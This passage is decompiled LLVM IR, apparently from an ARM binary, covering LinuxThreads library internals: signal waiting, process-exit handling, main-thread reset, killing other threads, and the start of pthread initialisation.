  %v4_1f878 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 256) to i32*), align 4
  %v0_1f87c = load i32, i32* @r0, align 4
  %v1_1f87c = add i32 %v0_1f87c, 20
  %v2_1f87c = inttoptr i32 %v1_1f87c to i32*
  %v3_1f87c = load i32, i32* %v2_1f87c, align 4
  %v1_1f880 = inttoptr i32 %v4_1f878 to i32*
  %v2_1f880 = load i32, i32* %v1_1f880, align 4
  %v2_1f884 = call i32 @kill(i32 %v3_1f87c, i32 %v2_1f880)
  ret i32 %v2_1f884
}

define i32 @__pthread_wait_for_restart_signal() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_1f89c = load i32, i32* @r7, align 4
  %v2_1f8a0 = ptrtoint i32* %stack_var_-32 to i32
  %v0_1f8a4 = load i32, i32* @r0, align 4
  store i32 %v0_1f8a4, i32* @r7, align 4
  %v3_1f8b8 = call i32 @__GI_sigprocmask(i32 2, i32 0, i32 %v2_1f8a0)
  store i32 256, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r6.global-to-local, align 4
  store i32 %v2_1f8a0, i32* @r0, align 4
  %v1_1f8d4 = call i32 @__GI_sigdelset(i32 %v2_1f8a0)
  %v1_1f8dc = load i32, i32* @r7, align 4
  %v2_1f8dc = add i32 %v1_1f8dc, 32
  %v3_1f8dc = inttoptr i32 %v2_1f8dc to i32*
  store i32 0, i32* %v3_1f8dc, align 4
  br label %dec_label_pc_1f8e0

dec_label_pc_1f8e0:                               ; preds = %dec_label_pc_1f8e0, %entry
  %v1_1f8e4 = call i32 @__GI_sigsuspend(i32 %v2_1f8a0)
  %v0_1f8e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1f8e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1f8e8 = add i32 %v1_1f8e8, %v0_1f8e8
  %v3_1f8e8 = inttoptr i32 %v2_1f8e8 to i32*
  %v4_1f8e8 = load i32, i32* %v3_1f8e8, align 4
  %v1_1f8ec = inttoptr i32 %v4_1f8e8 to i32*
  %v2_1f8ec = load i32, i32* %v1_1f8ec, align 4
  %v0_1f8f0 = load i32, i32* @r7, align 4
  %v1_1f8f0 = add i32 %v0_1f8f0, 32
  %v2_1f8f0 = inttoptr i32 %v1_1f8f0 to i32*
  %v3_1f8f0 = load i32, i32* %v2_1f8f0, align 4
  %v9_1f8f4 = icmp eq i32 %v3_1f8f0, %v2_1f8ec
  br i1 %v9_1f8f4, label %dec_label_pc_1f8fc, label %dec_label_pc_1f8e0

dec_label_pc_1f8fc:                               ; preds = %dec_label_pc_1f8e0
  store i32 %v12_1f89c, i32* @r7, align 4
  ret i32 %v1_1f8e4

; uselistorder directives
  uselistorder i32 %v2_1f8a0, { 0, 2, 1, 3 }
}

define i32 @_suspend.4(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1f910 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_1f910
}

define i32 @pthread_onexit_process() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v9_1f914 = load i32, i32* @r6, align 4
  %v12_1f914 = load i32, i32* @r7, align 4
  store i32 132, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  %v4_1f924 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 132) to i32*), align 4
  store i32 %v4_1f924, i32* @r7, align 4
  %v1_1f928 = inttoptr i32 %v4_1f924 to i32*
  %v2_1f928 = load i32, i32* %v1_1f928, align 4
  store i32 %v2_1f928, i32* %r3.global-to-local, align 4
  %v1_1f92c = icmp slt i32 %v2_1f928, 0
  %v0_1f934 = load i32, i32* @r0, align 4
  br i1 %v1_1f92c, label %dec_label_pc_1f9c8, label %dec_label_pc_1f93c

dec_label_pc_1f93c:                               ; preds = %entry
  %v0_1f93c = call i32 @_thread_self.3()
  store i32 %v0_1f93c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_1f93c, i32* %stack_var_-52, align 4
  store i32 %v0_1f93c, i32* @r4, align 4
  %v2_1f94c = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_1f950

dec_label_pc_1f950:                               ; preds = %dec_label_pc_1f968, %dec_label_pc_1f93c
  store i32 28, i32* %r2.global-to-local, align 4
  %v0_1f958 = load i32, i32* @r7, align 4
  %v1_1f958 = inttoptr i32 %v0_1f958 to i32*
  %v2_1f958 = load i32, i32* %v1_1f958, align 4
  store i32 %v2_1f958, i32* %r0.global-to-local, align 4
  %v3_1f95c = call i32 @write(i32 %v2_1f958, i32 %v2_1f94c, i32 28)
  store i32 %v3_1f95c, i32* %r0.global-to-local, align 4
  %v3_1f960 = icmp eq i32 %v3_1f95c, -1
  br i1 %v3_1f960, label %dec_label_pc_1f968, label %dec_label_pc_1f978

dec_label_pc_1f968:                               ; preds = %dec_label_pc_1f950
  %v0_1f968 = call i32 @__errno_location()
  store i32 %v0_1f968, i32* %r0.global-to-local, align 4
  %v1_1f96c = inttoptr i32 %v0_1f968 to i32*
  %v2_1f96c = load i32, i32* %v1_1f96c, align 4
  store i32 %v2_1f96c, i32* %r3.global-to-local, align 4
  %v7_1f970 = icmp eq i32 %v2_1f96c, 4
  br i1 %v7_1f970, label %dec_label_pc_1f950, label %dec_label_pc_1f978

dec_label_pc_1f978:                               ; preds = %dec_label_pc_1f950, %dec_label_pc_1f968
  %v0_1f978 = load i32, i32* @r4, align 4
  store i32 %v0_1f978, i32* @r0, align 4
  %v1_1f97c = call i32 @_suspend.4(i32 %v0_1f978)
  store i32 %v1_1f97c, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v0_1f984 = load i32, i32* @r5, align 4
  %v2_1f984 = add i32 %v0_1f984, 260
  %v3_1f984 = inttoptr i32 %v2_1f984 to i32*
  %v4_1f984 = load i32, i32* %v3_1f984, align 4
  store i32 %v4_1f984, i32* %r3.global-to-local, align 4
  %v1_1f988 = inttoptr i32 %v4_1f984 to i32*
  %v2_1f988 = load i32, i32* %v1_1f988, align 4
  store i32 %v2_1f988, i32* %r3.global-to-local, align 4
  %v0_1f98c = load i32, i32* @r4, align 4
  %v9_1f98c = icmp eq i32 %v0_1f98c, %v2_1f988
  br i1 %v9_1f98c, label %dec_label_pc_1f994, label %dec_label_pc_1f9c8

dec_label_pc_1f994:                               ; preds = %dec_label_pc_1f978
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_1f998 = add i32 %v0_1f984, 120
  %v3_1f998 = inttoptr i32 %v2_1f998 to i32*
  %v4_1f998 = load i32, i32* %v3_1f998, align 4
  store i32 %v4_1f998, i32* %r3.global-to-local, align 4
  %v1_1f9a0 = add i32 %v4_1f998, 20
  %v2_1f9a0 = inttoptr i32 %v1_1f9a0 to i32*
  %v3_1f9a0 = load i32, i32* %v2_1f9a0, align 4
  store i32 %v3_1f9a0, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r2.global-to-local, align 4
  %v3_1f9a8 = call i32 @waitpid(i32 %v3_1f9a0, i32 0, i32 -2147483648)
  store i32 %v3_1f9a8, i32* %r0.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_1f9b0 = load i32, i32* @r5, align 4
  %v2_1f9b0 = add i32 %v0_1f9b0, 44
  %v3_1f9b0 = inttoptr i32 %v2_1f9b0 to i32*
  %v4_1f9b0 = load i32, i32* %v3_1f9b0, align 4
  store i32 204, i32* %r3.global-to-local, align 4
  %v2_1f9b8 = add i32 %v0_1f9b0, 204
  %v3_1f9b8 = inttoptr i32 %v2_1f9b8 to i32*
  %v4_1f9b8 = load i32, i32* %v3_1f9b8, align 4
  store i32 %v4_1f9b8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1f9c0 = inttoptr i32 %v4_1f9b0 to i32*
  store i32 0, i32* %v2_1f9c0, align 4
  %v0_1f9c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1f9c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1f9c4 = inttoptr i32 %v1_1f9c4 to i32*
  store i32 %v0_1f9c4, i32* %v2_1f9c4, align 4
  %v1_1f9d0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1f9c8

dec_label_pc_1f9c8:                               ; preds = %dec_label_pc_1f978, %entry, %dec_label_pc_1f994
  %v1_1f9d0 = phi i32 [ %v1_1f97c, %dec_label_pc_1f978 ], [ %v0_1f934, %entry ], [ %v1_1f9d0.pre, %dec_label_pc_1f994 ]
  store i32 %v9_1f914, i32* @r6, align 4
  store i32 %v12_1f914, i32* @r7, align 4
  ret i32 %v1_1f9d0

; uselistorder directives
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0, 3, 4, 6, 5, 7 }
  uselistorder label %dec_label_pc_1f9c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1f978, { 1, 0 }
}

define i32 @function_1f9d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1f9d8:
  %v0_1f9d8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1f9d8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1f9d8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1f9d8, %bb
  %v7_1f9e8 = phi i32 [ %arg1, %dec_label_pc_1f9d8 ], [ 0, %bb ]
  ret i32 %v7_1f9e8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @__pthread_reset_main_thread() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v3_1f9ec = load i32, i32* @r4, align 4
  %v6_1f9ec = load i32, i32* @r5, align 4
  %v12_1f9ec = load i32, i32* @r7, align 4
  %v0_1f9f4 = call i32 @_thread_self.3()
  store i32 %v0_1f9f4, i32* @r0, align 4
  store i32 132, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  %v4_1fa04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 132) to i32*), align 4
  store i32 %v4_1fa04, i32* @r7, align 4
  %v1_1fa08 = inttoptr i32 %v4_1fa04 to i32*
  %v2_1fa08 = load i32, i32* %v1_1fa08, align 4
  store i32 %v2_1fa08, i32* %r3.global-to-local, align 4
  %v7_1fa0c = icmp eq i32 %v2_1fa08, -1
  store i32 %v0_1f9f4, i32* @r5, align 4
  br i1 %v7_1fa0c, label %dec_label_pc_1fa60, label %dec_label_pc_1fa18

dec_label_pc_1fa18:                               ; preds = %entry
  store i32 44, i32* %r3.global-to-local, align 4
  %v4_1fa1c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 44) to i32*), align 4
  store i32 %v4_1fa1c, i32* @r4, align 4
  %v1_1fa20 = inttoptr i32 %v4_1fa1c to i32*
  %v2_1fa20 = load i32, i32* %v1_1fa20, align 4
  store i32 %v2_1fa20, i32* @r0, align 4
  %v0_1fa24 = call i32 @free()
  store i32 204, i32* %r3.global-to-local, align 4
  %v0_1fa2c = load i32, i32* @r6, align 4
  %v2_1fa2c = add i32 %v0_1fa2c, 204
  %v3_1fa2c = inttoptr i32 %v2_1fa2c to i32*
  %v4_1fa2c = load i32, i32* %v3_1fa2c, align 4
  store i32 %v4_1fa2c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1fa34 = load i32, i32* @r4, align 4
  %v2_1fa34 = inttoptr i32 %v1_1fa34 to i32*
  store i32 0, i32* %v2_1fa34, align 4
  %v0_1fa38 = load i32, i32* %r3.global-to-local, align 4
  %v1_1fa38 = load i32, i32* %r2.global-to-local, align 4
  %v2_1fa38 = inttoptr i32 %v1_1fa38 to i32*
  store i32 %v0_1fa38, i32* %v2_1fa38, align 4
  %v0_1fa3c = load i32, i32* @r7, align 4
  %v1_1fa3c = inttoptr i32 %v0_1fa3c to i32*
  %v2_1fa3c = load i32, i32* %v1_1fa3c, align 4
  %v1_1fa40 = call i32 @close(i32 %v2_1fa3c)
  store i32 180, i32* %r3.global-to-local, align 4
  %v0_1fa48 = load i32, i32* @r6, align 4
  %v2_1fa48 = add i32 %v0_1fa48, 180
  %v3_1fa48 = inttoptr i32 %v2_1fa48 to i32*
  %v4_1fa48 = load i32, i32* %v3_1fa48, align 4
  store i32 %v4_1fa48, i32* @r4, align 4
  %v1_1fa4c = inttoptr i32 %v4_1fa48 to i32*
  %v2_1fa4c = load i32, i32* %v1_1fa4c, align 4
  %v1_1fa50 = call i32 @close(i32 %v2_1fa4c)
  store i32 %v1_1fa50, i32* @r0, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1fa58 = load i32, i32* @r7, align 4
  %v2_1fa58 = inttoptr i32 %v1_1fa58 to i32*
  store i32 -1, i32* %v2_1fa58, align 4
  %v0_1fa5c = load i32, i32* %r3.global-to-local, align 4
  %v1_1fa5c = load i32, i32* @r4, align 4
  %v2_1fa5c = inttoptr i32 %v1_1fa5c to i32*
  store i32 %v0_1fa5c, i32* %v2_1fa5c, align 4
  br label %dec_label_pc_1fa60

dec_label_pc_1fa60:                               ; preds = %entry, %dec_label_pc_1fa18
  %v0_1fa60 = call i32 @__GI_getpid()
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_1fa68 = load i32, i32* @r6, align 4
  %v2_1fa68 = add i32 %v0_1fa68, 48
  %v3_1fa68 = inttoptr i32 %v2_1fa68 to i32*
  %v4_1fa68 = load i32, i32* %v3_1fa68, align 4
  store i32 %v4_1fa68, i32* %r1.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_1fa70 = add i32 %v0_1fa68, 260
  %v3_1fa70 = inttoptr i32 %v2_1fa70 to i32*
  %v4_1fa70 = load i32, i32* %v3_1fa70, align 4
  store i32 %v4_1fa70, i32* %r2.global-to-local, align 4
  store i32 244, i32* %r3.global-to-local, align 4
  %v2_1fa78 = add i32 %v0_1fa68, 244
  %v3_1fa78 = inttoptr i32 %v2_1fa78 to i32*
  %v4_1fa78 = load i32, i32* %v3_1fa78, align 4
  store i32 %v4_1fa78, i32* %r3.global-to-local, align 4
  %v0_1fa7c = load i32, i32* @r5, align 4
  %v2_1fa7c = inttoptr i32 %v4_1fa70 to i32*
  store i32 %v0_1fa7c, i32* %v2_1fa7c, align 4
  %v0_1fa80 = load i32, i32* %r1.global-to-local, align 4
  %v1_1fa80 = load i32, i32* @r5, align 4
  %v2_1fa80 = add i32 %v1_1fa80, 76
  %v3_1fa80 = inttoptr i32 %v2_1fa80 to i32*
  store i32 %v0_1fa80, i32* %v3_1fa80, align 4
  %v1_1fa84 = load i32, i32* @r5, align 4
  %v2_1fa84 = add i32 %v1_1fa84, 20
  %v3_1fa84 = inttoptr i32 %v2_1fa84 to i32*
  store i32 %v0_1fa60, i32* %v3_1fa84, align 4
  %v0_1fa88 = load i32, i32* %r3.global-to-local, align 4
  %v1_1fa88 = load i32, i32* @r5, align 4
  %v2_1fa88 = add i32 %v1_1fa88, 68
  %v3_1fa88 = inttoptr i32 %v2_1fa88 to i32*
  store i32 %v0_1fa88, i32* %v3_1fa88, align 4
  %v0_1fa8c = load i32, i32* @r5, align 4
  %v2_1fa8c = inttoptr i32 %v0_1fa8c to i32*
  store i32 %v0_1fa8c, i32* %v2_1fa8c, align 4
  %v0_1fa90 = load i32, i32* @r5, align 4
  %v2_1fa90 = add i32 %v0_1fa90, 4
  %v3_1fa90 = inttoptr i32 %v2_1fa90 to i32*
  store i32 %v0_1fa90, i32* %v3_1fa90, align 4
  store i32 %v3_1f9ec, i32* @r4, align 4
  store i32 %v6_1f9ec, i32* @r5, align 4
  store i32 %v12_1f9ec, i32* @r7, align 4
  ret i32 %v0_1fa60

; uselistorder directives
  uselistorder i32 %v0_1fa90, { 1, 0 }
  uselistorder i32 %v0_1fa8c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 5, 8, 9, 10, 11, 12, 13 }
  uselistorder label %dec_label_pc_1fa60, { 1, 0 }
}

define i32 @function_1faa4(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1faa4:
  %v0_1faa4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1faa4, label %.thread2, label %.thread5

.thread2:                                         ; preds = %dec_label_pc_1faa4
  call void @llvm.trap()
  unreachable

.thread5:                                         ; preds = %dec_label_pc_1faa4
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_kill_other_threads_np() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 0, i32* @r0, align 4
  %v0_1fad0 = call i32 @pthread_onexit_process()
  %v2_1fad4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1fad4, i32* @r5, align 4
  store i32 151188, i32* @r4, align 4
  %v0_1fadc = call i32 @__pthread_reset_main_thread()
  store i32 0, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  store i32 %v2_1fad4, i32* @r0, align 4
  %v0_1faec = call i32 @__GI_memset()
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  %v4_1faf8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 256) to i32*), align 4
  %v1_1fafc = inttoptr i32 %v4_1faf8 to i32*
  %v2_1fafc = load i32, i32* %v1_1fafc, align 4
  store i32 %v2_1fad4, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  %v3_1fb08 = call i32 @__libc_sigaction(i32 %v2_1fafc)
  %v0_1fb10 = load i32, i32* @r4, align 4
  %v2_1fb10 = add i32 %v0_1fb10, 252
  %v3_1fb10 = inttoptr i32 %v2_1fb10 to i32*
  %v4_1fb10 = load i32, i32* %v3_1fb10, align 4
  store i32 %v2_1fad4, i32* @r1, align 4
  %v1_1fb18 = inttoptr i32 %v4_1fb10 to i32*
  %v2_1fb18 = load i32, i32* %v1_1fb18, align 4
  store i32 0, i32* @r2, align 4
  %v3_1fb20 = call i32 @__libc_sigaction(i32 %v2_1fb18)
  %v0_1fb28 = load i32, i32* @r4, align 4
  %v2_1fb28 = add i32 %v0_1fb28, 72
  %v3_1fb28 = inttoptr i32 %v2_1fb28 to i32*
  %v4_1fb28 = load i32, i32* %v3_1fb28, align 4
  %v1_1fb2c = inttoptr i32 %v4_1fb28 to i32*
  %v2_1fb2c = load i32, i32* %v1_1fb2c, align 4
  %tmp6 = icmp slt i32 %v2_1fb2c, 1
  br i1 %tmp6, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %tmp7 = phi i1 [ true, %bb ], [ false, %entry ]
  call void @__pseudo_cond_branch(i1 %tmp7, i32 ptrtoint (i32* @global_var_227dc.1376 to i32))
  ret i32 %v2_1fb2c

; uselistorder directives
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 256) to i32*), { 3, 4, 2, 0, 1, 5 }
  uselistorder i32 ()* @__pthread_reset_main_thread, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1fb50(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1fb50:
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1fb50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1fb50, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1fb50
  %v5_1fb50 = mul i32 %tmp, 4
  %v6_1fb50 = and i32 %v5_1fb50, %tmp
  %v4_1fb54 = inttoptr i32 %v6_1fb50 to i32*
  store i32 %v6_1fb50, i32* %v4_1fb54, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1fb50, %bb
  %v4_1fb58 = phi i32 [ %tmp, %dec_label_pc_1fb50 ], [ 0, %bb ]
  ret i32 %v4_1fb58

; uselistorder directives
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @pthread_initialize() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4194368 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1fb5c = load i32, i32* @r4, align 4
  store i32 %v3_1fb5c, i32* %stack_var_-24, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  %v4_1fb6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 64) to i32*), align 4
  store i32 %v4_1fb6c, i32* %r2.global-to-local, align 4
  %v1_1fb70 = inttoptr i32 %v4_1fb6c to i32*
  %v2_1fb70 = load i32, i32* %v1_1fb70, align 4
  store i32 %v2_1fb70, i32* %r4.global-to-local, align 4
  %v2_1fb74 = icmp eq i32 %v2_1fb70, 0
  br i1 %v2_1fb74, label %dec_label_pc_1fb80, label %dec_label_pc_1fd20

dec_label_pc_1fb80:                               ; preds = %entry
  %v2_1fb80 = ptrtoint i32* %stack_var_-4194368 to i32
  %v3_1fb84 = and i32 %v2_1fb80, -2097152
  store i32 %v3_1fb84, i32* %r3.global-to-local, align 4
  store i32 %v3_1fb84, i32* %v1_1fb70, align 4
  %v0_1fb90 = call i32 @__GI_getpid()
  store i32 108, i32* %r3.global-to-local, align 4
  %v0_1fb98 = load i32, i32* @r6, align 4
  %v2_1fb98 = add i32 %v0_1fb98, 108
  %v3_1fb98 = inttoptr i32 %v2_1fb98 to i32*
  %v4_1fb98 = load i32, i32* %v3_1fb98, align 4
  store i32 %v4_1fb98, i32* %ip.global-to-local, align 4
  store i32 184, i32* %r3.global-to-local, align 4
  %v2_1fba0 = add i32 %v0_1fb98, 184
  %v3_1fba0 = inttoptr i32 %v2_1fba0 to i32*
  %v4_1fba0 = load i32, i32* %v3_1fba0, align 4
  store i32 %v4_1fba0, i32* %r2.global-to-local, align 4
  store i32 244, i32* %r3.global-to-local, align 4
  %v2_1fba8 = add i32 %v0_1fb98, 244
  %v3_1fba8 = inttoptr i32 %v2_1fba8 to i32*
  %v4_1fba8 = load i32, i32* %v3_1fba8, align 4
  store i32 %v4_1fba8, i32* @lr, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  %v2_1fbb0 = add i32 %v0_1fb98, 48
  %v3_1fbb0 = inttoptr i32 %v2_1fbb0 to i32*
  %v4_1fbb0 = load i32, i32* %v3_1fbb0, align 4
  store i32 140, i32* %r3.global-to-local, align 4
  %v1_1fbb8 = inttoptr i32 %v4_1fb98 to i32*
  %v2_1fbb8 = load i32, i32* %v1_1fbb8, align 4
  store i32 %v2_1fbb8, i32* @r5, align 4
  %v2_1fbbc = add i32 %v0_1fb98, 140
  %v3_1fbbc = inttoptr i32 %v2_1fbbc to i32*
  %v4_1fbbc = load i32, i32* %v3_1fbbc, align 4
  store i32 %v4_1fbbc, i32* %r3.global-to-local, align 4
  %v0_1fbc0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1fbc0, i32* %ip.global-to-local, align 4
  %v2_1fbc4 = add i32 %v4_1fba0, 76
  %v3_1fbc4 = inttoptr i32 %v2_1fbc4 to i32*
  store i32 %v4_1fbb0, i32* %v3_1fbc4, align 4
  %v1_1fbc8 = load i32, i32* %r2.global-to-local, align 4
  %v2_1fbc8 = add i32 %v1_1fbc8, 20
  %v3_1fbc8 = inttoptr i32 %v2_1fbc8 to i32*
  store i32 %v0_1fb90, i32* %v3_1fbc8, align 4
  %v0_1fbcc = load i32, i32* @lr, align 4
  %v1_1fbcc = load i32, i32* %r2.global-to-local, align 4
  %v2_1fbcc = add i32 %v1_1fbcc, 68
  %v3_1fbcc = inttoptr i32 %v2_1fbcc to i32*
  store i32 %v0_1fbcc, i32* %v3_1fbcc, align 4
  %v0_1fbd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1fbd0 = load i32, i32* %r3.global-to-local, align 4
  %v2_1fbd0 = inttoptr i32 %v1_1fbd0 to i32*
  store i32 %v0_1fbd0, i32* %v2_1fbd0, align 4
  %v0_1fbe8.pr = load i32, i32* @r5, align 4
  %v2_1fbe82 = icmp eq i32 %v0_1fbe8.pr, 0
  br i1 %v2_1fbe82, label %dec_label_pc_1fbf0, label %dec_label_pc_1fbd8

dec_label_pc_1fbd8:                               ; preds = %dec_label_pc_1fb80, %dec_label_pc_1fbe8
  %v2_1fbe0 = phi i32 [ %v3_1fbe4, %dec_label_pc_1fbe8 ], [ %v0_1fbe8.pr, %dec_label_pc_1fb80 ]
  %v1_1fbd8 = add i32 %v2_1fbe0, 52
  %v2_1fbd8 = inttoptr i32 %v1_1fbd8 to i32*
  %v3_1fbd8 = load i32, i32* %v2_1fbd8, align 4
  store i32 %v3_1fbd8, i32* %r3.global-to-local, align 4
  %v7_1fbdc = icmp eq i32 %v3_1fbd8, 1
  br i1 %v7_1fbdc, label %dec_label_pc_1fbe8, label %bb

bb:                                               ; preds = %dec_label_pc_1fbd8
  %v1_1fbe0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_1fbe0, i32* %v2_1fbd8, align 4
  %v0_1fbe4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1fbe8

dec_label_pc_1fbe8:                               ; preds = %dec_label_pc_1fbd8, %bb
  %v0_1fbe4 = phi i32 [ %v2_1fbe0, %dec_label_pc_1fbd8 ], [ %v0_1fbe4.pre, %bb ]
  %v1_1fbe4 = add i32 %v0_1fbe4, 32
  %v2_1fbe4 = inttoptr i32 %v1_1fbe4 to i32*
  %v3_1fbe4 = load i32, i32* %v2_1fbe4, align 4
  store i32 %v3_1fbe4, i32* @r5, align 4
  %v2_1fbe8 = icmp eq i32 %v3_1fbe4, 0
  br i1 %v2_1fbe8, label %dec_label_pc_1fbe8.dec_label_pc_1fbf0_crit_edge, label %dec_label_pc_1fbd8

dec_label_pc_1fbe8.dec_label_pc_1fbf0_crit_edge:  ; preds = %dec_label_pc_1fbe8
  br label %dec_label_pc_1fbf0

dec_label_pc_1fbf0:                               ; preds = %dec_label_pc_1fbe8.dec_label_pc_1fbf0_crit_edge, %dec_label_pc_1fb80
  %v2_1fbf0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1fbf0, i32* %r4.global-to-local, align 4
  %v2_1fbfc = call i32 @getrlimit(i32 3, i32 %v2_1fbf0)
  %v0_1fc00 = call i32 @__GI_getpagesize()
  %v3_1fc08 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_1fc08, i32* %r3.global-to-local, align 4
  %tmp = mul i32 %v0_1fc00, -2
  %v1_1fc0c = add i32 %tmp, 2097152
  store i32 %v1_1fc0c, i32* %r2.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v3_1fc08, %v1_1fc0c
  br i1 %tmp24, label %bb22, label %.thread7

bb22:                                             ; preds = %dec_label_pc_1fbf0
  store i32 %v1_1fc0c, i32* %stack_var_-40, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1fbf0, %bb22
  store i32 130084, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp24, i32 ptrtoint (i32* @global_var_2318c.1384 to i32))
  %v2_1fc24 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_1fc24, i32* @r4, align 4
  %v0_1fc28 = load i32, i32* @r5, align 4
  store i32 %v0_1fc28, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  store i32 %v2_1fc24, i32* @r0, align 4
  %v0_1fc34 = call i32 @__GI_memset()
  store i32 256, i32* %r3.global-to-local, align 4
  %v0_1fc3c = load i32, i32* @r6, align 4
  %v2_1fc3c = add i32 %v0_1fc3c, 256
  %v3_1fc3c = inttoptr i32 %v2_1fc3c to i32*
  %v4_1fc3c = load i32, i32* %v3_1fc3c, align 4
  store i32 %v4_1fc3c, i32* @r7, align 4
  %v0_1fc44 = load i32, i32* @r5, align 4
  store i32 %v0_1fc44, i32* @r2, align 4
  %v2_1fc48 = add i32 %v0_1fc3c, -149448
  store i32 %v2_1fc48, i32* %r3.global-to-local, align 4
  store i32 %v2_1fc24, i32* @r1, align 4
  %v1_1fc50 = inttoptr i32 %v4_1fc3c to i32*
  %v2_1fc50 = load i32, i32* %v1_1fc50, align 4
  store i32 %v2_1fc48, i32* %stack_var_-60, align 4
  %v3_1fc58 = call i32 @__libc_sigaction(i32 %v2_1fc50)
  store i32 -149668, i32* %r3.global-to-local, align 4
  %v0_1fc60 = load i32, i32* @r7, align 4
  %v1_1fc60 = inttoptr i32 %v0_1fc60 to i32*
  %v2_1fc60 = load i32, i32* %v1_1fc60, align 4
  %v0_1fc64 = load i32, i32* @r6, align 4
  %v2_1fc64 = add i32 %v0_1fc64, -149668
  store i32 %v2_1fc64, i32* %r3.global-to-local, align 4
  %v2_1fc68 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1fc68, i32* @r0, align 4
